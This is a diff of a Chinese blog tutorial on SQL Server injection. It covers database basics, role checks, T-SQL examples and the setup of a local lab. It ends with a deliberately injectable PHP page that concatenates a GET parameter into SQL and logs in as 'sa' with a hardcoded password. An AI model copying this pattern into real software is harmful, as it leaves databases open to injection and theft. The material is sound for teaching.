+    <a target="_blank" rel="noopener" href="https://github.com/CurlySean" class="github-corner color-primary" aria-label="View source on GitHub"><svg width="60" height="60" viewBox="0 0 250 250" style="fill:#fff; position: absolute; top: 0; border: 0; right: 0;" aria-hidden="true"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"></path></svg></a><style>.github-corner:hover .octo-arm{animation:octocat-wave 560ms ease-in-out}@keyframes octocat-wave{0%,100%{transform:rotate(0)}20%,60%{transform:rotate(-25deg)}40%,80%{transform:rotate(10deg)}}@media (max-width:500px){.github-corner:hover .octo-arm{animation:none}.github-corner .octo-arm{animation:octocat-wave 560ms ease-in-out}}</style>
+  
+  
+</header>
+        <!-- 内容区域 -->
+        
+<!-- prismjs 代码高亮 -->
+
+
+
+
+<div class="bg-dark-floor" style="position: fixed;left: 0;top: 0;width: 100%;height: 100%;z-index: -1;"></div>
+
+
+  <!-- 文章详情页顶部图片和标题 -->
+
+
+
+
+<div class="post-detail-header" id="thumbnail_canvas" style="background-repeat: no-repeat; background-size: cover; 
+  background-position: center center;position: relative;background-image:url('https://pic2.zhimg.com/80/v2-63bbdb5b76b8d349ad35ff4281efbd37_1440w.webp')">
+  <div class="post-detail-header-mask"></div>
+  <canvas id="header_canvas"style="position:absolute;bottom:0;pointer-events:none;"></canvas>
+  
+  <div class="post-detail-header_info-box">
+    <div class="title-box">
+      <span class="title">
+        基于SqlServer的SQL注入
       </span>
-      <span class="post-meta-item-text">阅读次数：</span>
-      <span id="busuanzi_value_page_pv"></span>
-    </span>
+    </div>
+    
+    
+      
+        <span class="post-detail-header_date">
+          <i class="fas fa-calendar"></i> 发表于：2025-07-09 |
+        </span>
+      
+
+      
+        <span class="post-detail-header_categories">
+          <i class="iconfont iconbookmark1"></i> 分类：
+          
+            <a href="/categories/Web/" class="post-detail-header_category">
+              Web
+            </a>
+          
+        </span>
+      
+
+      
+    
+  </div>
+  
+  
+    <script defer src="/js/bubble/bubble.js"></script>
+  
 </div>
 
-        </div>
-      </header>
 
-    
-    
-    
-    <div class="post-body" itemprop="articleBody"><h1 id="Ie5J5">基于SqlServer的SQL注入</h1>
+
+
+
+<div class="post-detail-content post-row" 
+  style="padding-top: 0px;">
+  <div class="main-content">
+    <article class="post post-detail">
+      <div class="post-content">
+        <h1 id="Ie5J5">基于SqlServer的SQL注入</h1>
 <h2 id="YBV7G">前言</h2>
-最近面试了几家实习，都问了基于SqlServer的SQL注入，所以今天想补一下基础。
 
+<p>最近面试了几家实习，都问了基于SqlServer的SQL注入，所以今天想补一下基础。</p>
 <h2 id="o2JTT">SqlServer搭建</h2>
-搭建SqlServer，我们的环境和版本如下：
 
+<p>搭建SqlServer，我们的环境和版本如下：</p>
 <ul>
 <li>Windows Server 2012</li>
 <li>SqlServer 2012</li>
 </ul>
 <p>这里的SqlServer环境搭建比较简单，可以参考该链接进行安装 <a target="_blank" rel="noopener" href="https://blog.csdn.net/gengkui9897/article/details/89301494">https://blog.csdn.net/gengkui9897/article/details/89301494</a></p>
 <h2 id="vucaF">SqlServer基础</h2>
-Microsoft SQL Server（微软结构化查询语言服务器）也叫Mssql，它是一个数据库平台，提供数据库的从服务器到终端的完整的解决方案，其中数据库服务器部分，是一个数据库管理系统，用于建立、使用和维护数据库。属关系型数据库。默认端口号为1433。
 
+<p>Microsoft SQL Server（微软结构化查询语言服务器）也叫Mssql，它是一个数据库平台，提供数据库的从服务器到终端的完整的解决方案，其中数据库服务器部分，是一个数据库管理系统，用于建立、使用和维护数据库。属关系型数据库。默认端口号为1433。</p>
 <h3 id="ZNxWD">默认数据库</h3>
-安装好SqlServer后，SqlServer数据库中会有6个默认的库，用于维护系统正常运行的**系统数据库**，其中包括四个系统数据库：`master 、model 、msdb 、tempdb` ，和两个实例数据库：`ReportServer、ReportServerTempDB`
 
+<p>安装好SqlServer后，SqlServer数据库中会有6个默认的库，用于维护系统正常运行的<strong>系统数据库</strong>，其中包括四个系统数据库：<code>master 、model 、msdb 、tempdb</code> ，和两个实例数据库：<code>ReportServer、ReportServerTempDB</code></p>
 <h4 id="kL0Os">系统数据库：</h4>
-+ **master：**记录了SqlServer实例的所有系统级消息，包括实例范围的元数据（如登录账号、端点、链接服务器和系统配置设置）
-+ msdb：供SqlServer代理服务调度报警和作业记录操作员的使用，保存关于调度报警、作业、操作员等信息
-+ model：SqlServer实例上创建的所有数据库的模板
-+ tempdb：临时数据库，用于保存临时对象或中间结果集，为数据库的排列等操作提供一个临时的工作空间
 
+<ul>
+<li>**master：**记录了SqlServer实例的所有系统级消息，包括实例范围的元数据（如登录账号、端点、链接服务器和系统配置设置）</li>
+<li>msdb：供SqlServer代理服务调度报警和作业记录操作员的使用，保存关于调度报警、作业、操作员等信息</li>
+<li>model：SqlServer实例上创建的所有数据库的模板</li>
+<li>tempdb：临时数据库，用于保存临时对象或中间结果集，为数据库的排列等操作提供一个临时的工作空间</li>
+</ul>
 <h4 id="qWTUS">实例数据库：</h4>
-+ ReportServer：存储SSRS配置部分，报告定义，报告元数据，报告历史，缓存政策，快照，资源，安全设置，加密的数据，调度和提交数据，以及扩展信息
-+ ReportServerTempDB：存储中间处理产品，例如缓冲的报告、会话和执行数据等
 
+<ul>
+<li>ReportServer：存储SSRS配置部分，报告定义，报告元数据，报告历史，缓存政策，快照，资源，安全设置，加密的数据，调度和提交数据，以及扩展信息</li>
+<li>ReportServerTempDB：存储中间处理产品，例如缓冲的报告、会话和执行数据等</li>
+</ul>
 <h3 id="VGws7">数据库的组成</h3>
-在SqlServer中，数据库是以文件的形式存在的，由文件和文件组组成
 
+<p>在SqlServer中，数据库是以文件的形式存在的，由文件和文件组组成</p>
 <h4 id="cgnEs">文件</h4>
-数据库中的文件基本是分为以下三类：
 
+<p>数据库中的文件基本是分为以下三类：</p>
 <ul>
 <li>主要数据文件：存放数据和数据库的初始化信息。每个数据库有且只能有一个主要数据文件<code>.mdf</code>结尾</li>
 <li>次要数据文件：存放除了主要数据文件以外的所有数据文件。次要数据文件不是必须的，可以没有，也可以有多个<code>.ndf</code>结尾</li>
 <li>事务日志文件：存放用户回复数据库的所有文件信息。每个数据库至少有一个日志文件，也可以有多个<code>.ldf</code>结尾</li>
 </ul>
 <h4 id="Eo4Ms">文件组</h4>
-文件组是数据库文件一种逻辑管理单位，他将数据库文件分成不同的文件组，方便对文件的分配和管理，分为两种类型：
 
+<p>文件组是数据库文件一种逻辑管理单位，他将数据库文件分成不同的文件组，方便对文件的分配和管理，分为两种类型：</p>
 <ul>
 <li>主文件组Primary：主要是数据文件和没有明确指派给其他文件组的文件</li>
 <li>用户自定义的文件组：Create DataBase 或者 Alter DataBase语句，FileGroup关键字指定的文件组</li>
 </ul>
 <h4 id="x8Cvj">设计原则</h4>
-SqlServer数据库的设计原则如下
 
+<p>SqlServer数据库的设计原则如下</p>
 <ul>
 <li>文件只能是一个文件组的成员</li>
 <li>文件或文件组不能由多个数据库使用</li>
 <li>日志不能作为文件组的一部分</li>
 </ul>
 <h3 id="Cm4QN">SqlServer权限</h3>
-sqlserver中的权限控制被分成服务器和数据库两个级别，一个服务器可以包含多个数据库。服务器级别权限可以让我们控制登录、服务器资源操作等等；数据库级别的权限可以让我们对具体的表\视图\数据等数据库内资源进行操作。
 
+<p>sqlserver中的权限控制被分成服务器和数据库两个级别，一个服务器可以包含多个数据库。服务器级别权限可以让我们控制登录、服务器资源操作等等；数据库级别的权限可以让我们对具体的表\视图\数据等数据库内资源进行操作。</p>
 <p>在SQL注入的漏洞挖掘中，我们关注的是sqlserver服务器级别的权限，可以把权限简单的归为以下三类：</p>
 <ul>
 <li>**sa权限：**即服务器角色sysadmin。拥有数据库操作，文件管理，命令执行，注册表读取等权限。SQLServer数据库的最高权限 </li>
@@ -347,56 +580,56 @@ sqlserver中的权限控制被分成服务器和数据库两个级别，一个�
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">--判断是否是SA权限</span><br><span class="line">select <span class="title function_">is_srvrolemember</span><span class="params">(<span class="string">&#x27;sysadmin&#x27;</span>)</span>     </span><br><span class="line">--判断是否是db_owner权限  </span><br><span class="line">select <span class="title function_">is_member</span><span class="params">(<span class="string">&#x27;db_owner&#x27;</span>)</span></span><br><span class="line">--判断是否是<span class="keyword">public</span>权限</span><br><span class="line">select <span class="title function_">is_srvrolemember</span><span class="params">(<span class="string">&#x27;public&#x27;</span>)</span></span><br></pre></td></tr></table></figure>
 
 <h2 id="ybo2c">T-SQL语言</h2>
-在mysql数据库中使用sql语句对数据库进行操作，而在sqlserver数据库中使用的是Transaction-SQL语言，简称T-SQL。T-SQL是在SQL基础之上的一种数据库编程语言。
 
+<p>在mysql数据库中使用sql语句对数据库进行操作，而在sqlserver数据库中使用的是Transaction-SQL语言，简称T-SQL。T-SQL是在SQL基础之上的一种数据库编程语言。</p>
 <p>在这篇文章中，我们基于增删改查和创建数据库去简单了解T-SQL语言</p>
 <h3 id="dfWqj">创建数据库</h3>
-用T-SQL去创建名为SQLDB的数据库，语句如下
 
+<p>用T-SQL去创建名为SQLDB的数据库，语句如下</p>
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CREATE DATABASE SQLDB;</span><br></pre></td></tr></table></figure>
 
 <p>如果希望对数据库的文件路径、大小、增长方式等进行配置，可以使用以下命令</p>
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">CREATE DATABASE SQLDB</span><br><span class="line">ON <span class="title function_">PRIMARY</span> <span class="params">(</span></span><br><span class="line"><span class="params">    NAME = SQLDB_data,</span></span><br><span class="line"><span class="params">    FILENAME = <span class="string">&#x27;C:\MSSQL\DATA\SQLDB_data.mdf&#x27;</span>,</span></span><br><span class="line"><span class="params">    SIZE = 10MB,</span></span><br><span class="line"><span class="params">    MAXSIZE = 100MB,</span></span><br><span class="line"><span class="params">    FILEGROWTH = 5MB</span></span><br><span class="line"><span class="params">)</span></span><br><span class="line">LOG <span class="title function_">ON</span> <span class="params">(</span></span><br><span class="line"><span class="params">    NAME = SQLDB_log,</span></span><br><span class="line"><span class="params">    FILENAME = <span class="string">&#x27;C:\MSSQL\DATA\SQLDB_log.ldf&#x27;</span>,</span></span><br><span class="line"><span class="params">    SIZE = 5MB,</span></span><br><span class="line"><span class="params">    MAXSIZE = 50MB,</span></span><br><span class="line"><span class="params">    FILEGROWTH = 5MB</span></span><br><span class="line"><span class="params">)</span>;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
 
-<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1749273823298-089e8d08-ccaa-49dc-82f8-17a60af1f3bc.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1749273823298-089e8d08-ccaa-49dc-82f8-17a60af1f3bc.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1749273823298-089e8d08-ccaa-49dc-82f8-17a60af1f3bc.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
 <h3 id="waUGu">创建表</h3>
-用T-SQL在SQLDB中新建表，新建表的时候要同时指明字段信息
 
+<p>用T-SQL在SQLDB中新建表，新建表的时候要同时指明字段信息</p>
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">-- 切换到 SQLDB 数据库</span><br><span class="line">USE SQLDB;</span><br><span class="line">GO</span><br><span class="line"></span><br><span class="line">-- 创建一个名为 Employees 的表</span><br><span class="line">CREATE TABLE <span class="title function_">Employees</span> <span class="params">(</span></span><br><span class="line"><span class="params">    EmployeeID INT PRIMARY KEY IDENTITY(<span class="number">1</span>,<span class="number">1</span>)</span>,  -- 员工ID，主键，自增</span><br><span class="line">    FirstName <span class="title function_">NVARCHAR</span><span class="params">(<span class="number">50</span>)</span> NOT NULL,           -- 名，最大<span class="number">50</span>字符，不能为空</span><br><span class="line">    LastName <span class="title function_">NVARCHAR</span><span class="params">(<span class="number">50</span>)</span> NOT NULL,            -- 姓，最大<span class="number">50</span>字符，不能为空</span><br><span class="line">    BirthDate DATE NULL,                       -- 出生日期，可以为空</span><br><span class="line">    HireDate DATE NOT NULL,                    -- 入职日期，不能为空</span><br><span class="line">    Email <span class="title function_">NVARCHAR</span><span class="params">(<span class="number">100</span>)</span> UNIQUE,                -- 邮箱，唯一约束，可为空</span><br><span class="line">    Salary <span class="title function_">DECIMAL</span><span class="params">(<span class="number">10</span>, <span class="number">2</span>)</span> CHECK (Salary &gt;= <span class="number">0</span>)  -- 工资，保留两位小数，必须为非负数</span><br><span class="line">);</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1749274154500-0fbfc9ac-df90-4df4-a735-d3905eef6611.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1749274154500-0fbfc9ac-df90-4df4-a735-d3905eef6611.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1749274154500-0fbfc9ac-df90-4df4-a735-d3905eef6611.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
 <h3 id="bGBmK">增删改查</h3>
 <h4 id="Ece5h">插入数据</h4>
-使用Insert向该表中插入数据，可以使用以下命令：
 
+<p>使用Insert向该表中插入数据，可以使用以下命令：</p>
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">-- 切换到 SQLDB 数据库</span><br><span class="line">USE SQLDB;</span><br><span class="line">GO</span><br><span class="line"></span><br><span class="line">-- 向 Employees 表插入一条记录（不包括自增主键 EmployeeID）</span><br><span class="line">INSERT INTO <span class="title function_">Employees</span> <span class="params">(FirstName, LastName, BirthDate, HireDate, Email, Salary)</span></span><br><span class="line">VALUES (</span><br><span class="line">    <span class="string">&#x27;John&#x27;</span>,                -- FirstName</span><br><span class="line">    <span class="string">&#x27;Doe&#x27;</span>,                 -- LastName</span><br><span class="line">    <span class="string">&#x27;1985-06-15&#x27;</span>,          -- BirthDate</span><br><span class="line">    <span class="string">&#x27;2020-01-10&#x27;</span>,          -- HireDate</span><br><span class="line">    <span class="string">&#x27;john.doe@example.com&#x27;</span>,-- Email</span><br><span class="line">    <span class="number">5500.00</span>                -- Salary</span><br><span class="line">);</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1749274430512-4d8c38c1-16bd-419b-9239-7e71cb1cf558.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1749274430512-4d8c38c1-16bd-419b-9239-7e71cb1cf558.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1749274430512-4d8c38c1-16bd-419b-9239-7e71cb1cf558.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
 <h4 id="TGGaN">删除数据</h4>
-使用DELETE删除名为John Doe的员工，命令如下
 
+<p>使用DELETE删除名为John Doe的员工，命令如下</p>
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">-- 删除名为 John Doe 的员工</span><br><span class="line">DELETE FROM Employees</span><br><span class="line"><span class="type">WHERE</span> <span class="variable">FirstName</span> <span class="operator">=</span> <span class="string">&#x27;John&#x27;</span> <span class="type">AND</span> <span class="variable">LastName</span> <span class="operator">=</span> <span class="string">&#x27;Doe&#x27;</span>;</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1749274538213-7a61e8f0-f9b1-42fa-980e-0d0034267d3e.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1749274538213-7a61e8f0-f9b1-42fa-980e-0d0034267d3e.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1749274538213-7a61e8f0-f9b1-42fa-980e-0d0034267d3e.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
 <h4 id="Xbebe">修改数据</h4>
-修改名为Sean Doe的员工的薪资，修改为`6000.00`
 
+<p>修改名为Sean Doe的员工的薪资，修改为<code>6000.00</code></p>
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">-- 修改名为 Sean Doe 的员工薪资为 <span class="number">6000.00</span></span><br><span class="line">UPDATE Employees</span><br><span class="line"><span class="type">SET</span> <span class="variable">Salary</span> <span class="operator">=</span> <span class="number">6000.00</span></span><br><span class="line"><span class="type">WHERE</span> <span class="variable">FirstName</span> <span class="operator">=</span> <span class="string">&#x27;Sean&#x27;</span> <span class="type">AND</span> <span class="variable">LastName</span> <span class="operator">=</span> <span class="string">&#x27;Doe&#x27;</span>;</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1749274637417-9a73bfad-551d-49c6-a02a-9ea4a55cfd8d.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1749274637417-9a73bfad-551d-49c6-a02a-9ea4a55cfd8d.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1749274637417-9a73bfad-551d-49c6-a02a-9ea4a55cfd8d.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
 <h4 id="egPq9">查询数据</h4>
-查询数据的所使用的语句基本结构如下
 
+<p>查询数据的所使用的语句基本结构如下</p>
 <p>后续进行SQL注入时，使用查询语句的频率最高</p>
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">SELECT &lt;列名<span class="number">1</span>&gt;, &lt;列名<span class="number">2</span>&gt;, ...</span><br><span class="line">FROM &lt;表名&gt;</span><br><span class="line">[WHERE &lt;筛选条件&gt;]</span><br><span class="line">[GROUP BY &lt;分组列&gt;]</span><br><span class="line">[HAVING &lt;分组后的筛选条件&gt;]</span><br><span class="line">[ORDER BY &lt;排序列&gt; [ASC|DESC]];</span><br></pre></td></tr></table></figure>
 
 <p>这里我们举个例子，可以使用以下 T-SQL 语句来查询名为 Sean Doe 的员工的邮箱和薪资信息</p>
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">SELECT Email, Salary</span><br><span class="line">FROM Employees</span><br><span class="line"><span class="type">WHERE</span> <span class="variable">FirstName</span> <span class="operator">=</span> <span class="string">&#x27;Sean&#x27;</span> <span class="type">AND</span> <span class="variable">LastName</span> <span class="operator">=</span> <span class="string">&#x27;Doe&#x27;</span>;</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1749274859375-1b2cfc38-dada-475c-9c7a-56c66ee3b16c.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1749274859375-1b2cfc38-dada-475c-9c7a-56c66ee3b16c.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1749274859375-1b2cfc38-dada-475c-9c7a-56c66ee3b16c.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
 <h2 id="X0Ppb">SqlServer手工注入</h2>
-MSSQL注入攻击是最为复杂的数据库攻击技术，由于该数据库的功能十分强大，存储过程以及函数语句十分丰富，这些灵活的语句造就了新颖的攻击思路。
 
+<p>MSSQL注入攻击是最为复杂的数据库攻击技术，由于该数据库的功能十分强大，存储过程以及函数语句十分丰富，这些灵活的语句造就了新颖的攻击思路。</p>
 <p>对于MSSQL注入点，我们往往最关心的是这个注入点的权限问题，上面讲过，对于MSSQL有以下三个权限：</p>
 <ol>
 <li>sa（最高权限 System）</li>
@@ -417,30 +650,30 @@ MSSQL注入攻击是最为复杂的数据库攻击技术，由于该数据库的
 
 <p>需要在phpstudy中添加sqlsrv扩展，下载链接<a target="_blank" rel="noopener" href="https://learn.microsoft.com/en-us/sql/connect/php/release-notes-php-sql-driver?view=sql-server-ver15#previous-releases">https://learn.microsoft.com/en-us/sql/connect/php/release-notes-php-sql-driver?view=sql-server-ver15#previous-releases</a></p>
 <p>因为我这里是php7.3.4版本，我们需要将这两个文件放到<code>C:\phpstudy_pro\Extensions\php\php7.3.4nts\ext</code>目录下</p>
-<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1749278764229-24daed4b-4130-40f2-ba42-c3e5aa3a7181.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1749278764229-24daed4b-4130-40f2-ba42-c3e5aa3a7181.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1749278764229-24daed4b-4130-40f2-ba42-c3e5aa3a7181.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
 <p>并在php.ini文件中添加这两行配置</p>
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">extension=php_sqlsrv_63_nts.dll</span><br><span class="line">extension=php_pdo_sqlsrv_73_nts.dll</span><br></pre></td></tr></table></figure>
 
 <p>进入phpinfo界面后，可以看到我们的sqlsrv扩展就已经配置好了</p>
-<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1749279018263-2dfcd35e-23eb-4c24-8a63-ec895ad57e94.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1749279018263-2dfcd35e-23eb-4c24-8a63-ec895ad57e94.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1749279018263-2dfcd35e-23eb-4c24-8a63-ec895ad57e94.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
 <p>除此之外，还需要去安装ODBC Driver，链接如下（64位电脑安装64位驱动即可）</p>
 <p><a target="_blank" rel="noopener" href="https://files.cnblogs.com/files/wtcl/sqlserverodbc.zip">https://files.cnblogs.com/files/wtcl/sqlserverodbc.zip</a></p>
-<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1749279529839-7ee6566a-38e7-4727-87db-72943da5821a.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1749279529839-7ee6566a-38e7-4727-87db-72943da5821a.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1749279529839-7ee6566a-38e7-4727-87db-72943da5821a.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
 <p>在网站目录下，创建一个进行sql查询的php文件，源码如下：</p>
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"><span class="title function_">header</span><span class="params">(<span class="string">&quot;Content-Type:text/html;charset=gbk&quot;</span>)</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 数据库连接</span></span><br><span class="line">$conn = sqlsrv_connect(<span class="string">&#x27;127.0.0.1&#x27;</span>, array(</span><br><span class="line">    <span class="string">&#x27;Database&#x27;</span> =&gt; <span class="string">&#x27;SchoolDB&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;UID&#x27;</span> =&gt; <span class="string">&#x27;sa&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;PWD&#x27;</span> =&gt; <span class="string">&#x27;@sql123&#x27;</span></span><br><span class="line">));</span><br><span class="line"></span><br><span class="line"><span class="comment">// 连接失败时输出错误</span></span><br><span class="line"><span class="keyword">if</span> ($conn === <span class="literal">false</span>) &#123;</span><br><span class="line">    var_dump(sqlsrv_errors());</span><br><span class="line">    exit;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 获取 GET 参数 id（注意：这是一个注入测试场景）</span></span><br><span class="line">$id = $_GET[<span class="string">&quot;id&quot;</span>];</span><br><span class="line"></span><br><span class="line"><span class="comment">// 拼接 SQL 语句</span></span><br><span class="line">$sql = <span class="string">&quot;SELECT * FROM Students WHERE StudentID = $id&quot;</span>;</span><br><span class="line">echo <span class="string">&quot;SQL Server injection exercise!&lt;br/&gt;&lt;br/&gt;&quot;</span>;</span><br><span class="line">echo <span class="string">&quot;sql: &quot;</span> . $sql . <span class="string">&quot;&lt;hr&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 执行查询</span></span><br><span class="line">$result = sqlsrv_query($conn, $sql);</span><br><span class="line">var_dump(sqlsrv_errors());</span><br><span class="line">echo <span class="string">&quot;&lt;hr&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 输出结果</span></span><br><span class="line"><span class="keyword">if</span> ($re = sqlsrv_fetch_array($result, SQLSRV_FETCH_ASSOC)) &#123;</span><br><span class="line">    echo <span class="string">&quot;学号：&quot;</span> . $re[<span class="string">&#x27;StudentID&#x27;</span>] . <span class="string">&quot;&lt;br/&gt;&quot;</span>;</span><br><span class="line">    echo <span class="string">&quot;姓名：&quot;</span> . $re[<span class="string">&#x27;StudentName&#x27;</span>] . <span class="string">&quot;&lt;br/&gt;&quot;</span>;</span><br><span class="line">    echo <span class="string">&quot;年龄：&quot;</span> . $re[<span class="string">&#x27;Age&#x27;</span>] . <span class="string">&quot;&lt;br/&gt;&quot;</span>;</span><br><span class="line">    echo <span class="string">&quot;班级：&quot;</span> . $re[<span class="string">&#x27;Class&#x27;</span>] . <span class="string">&quot;&lt;br/&gt;&quot;</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    echo <span class="string">&quot;未找到该学生。&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
 
